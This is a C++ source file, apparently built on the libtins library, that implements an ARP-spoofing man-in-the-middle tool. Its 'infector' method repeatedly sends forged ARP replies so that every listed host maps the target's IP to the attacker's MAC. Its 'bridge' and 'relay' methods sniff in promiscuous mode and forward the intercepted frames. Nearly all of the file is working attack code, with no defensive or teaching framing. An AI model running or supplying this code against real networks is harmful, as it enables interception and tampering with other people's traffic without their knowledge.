#include "spoofer.h"
#include <iostream>
#include <unistd.h>
#include "printdata.h"

HWAddress<6> Spoofer::getLocal_mac() const
{
    return local_mac;
}

void Spoofer::setLocal_mac(const HWAddress<6> &value)
{
    local_mac = value;
}

IPv4Address Spoofer::getTarget_ip() const
{
    return target_ip;
}

void Spoofer::setTarget_ip(const IPv4Address &value)
{
    target_ip = value;
    target_mac= Utils::resolve_hwaddr(iface,target_ip,sender);
}

HWAddress<6> Spoofer::getTarget_mac() const
{
    return target_mac;
}

void Spoofer::setTarget_mac(const HWAddress<6> &value)
{
    target_mac = value;
}

IPv4Address Spoofer::getLocal_ip() const
{
    return local_ip;
}

void Spoofer::setLocal_ip(const IPv4Address &value)
{
    local_ip = value;
}

Spoofer::Spoofer()
{
    iface=iface.default_interface();
}

void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
{

    EthernetII arp_infection;
    ARP arp;
    while(condition)
    {
        for(const auto elem : addresses)
        {
            //To avoid recursive infection
            if(elem.first==target_ip)
                continue;

//            if(elem.first!="192.168.0.69")
//                continue;
            arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);

            sender.send(arp_infection,iface);
        }
        usleep(500);
    }
}

IPv4Address Spoofer::getLocalIpAddr()
{
    return iface.ipv4_address();
}

EthernetII::address_type Spoofer::getMacAddr(IPv4Address unknown)
{
    NetworkInterface iface;
    iface=getLocalIpAddr();

    // Why shoud I use try catch?? Am I Coding as java?
    // I want to control myself
    try{
        return Utils::resolve_hwaddr(iface,unknown,sender);
    }catch(...){

        return NULL;
    }

}

void Spoofer::semaphore()
{
    condition=!condition;
}

bool Spoofer::relay(PDU &pdu)
{

    EthernetII& ethII = pdu.rfind_pdu<EthernetII>();
    const IP& ip = pdu.rfind_pdu<IP>();

    //there is need to relay
    if((ip.dst_addr() != local_ip) && (ethII.dst_addr() == local_mac))
    {

        //change dest mac to origin target mac
        ethII.dst_addr(target_mac);

        //relay
        try{
        sender.send(pdu,iface);
        }catch(...)
        {
//            RawPDU &rawPDU = pdu.rfind_pdu<RawPDU>();
//            printByHexData(rawPDU.payload().data(),rawPDU.payload_size());
        }
    }

    if(!condition)
        return condition;

    return true;

}

void Spoofer::bridge()
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    Sniffer sniffer(iface.name(),config);
    sniffer.sniff_loop(make_sniffer_handler(this, &Spoofer::relay));
}

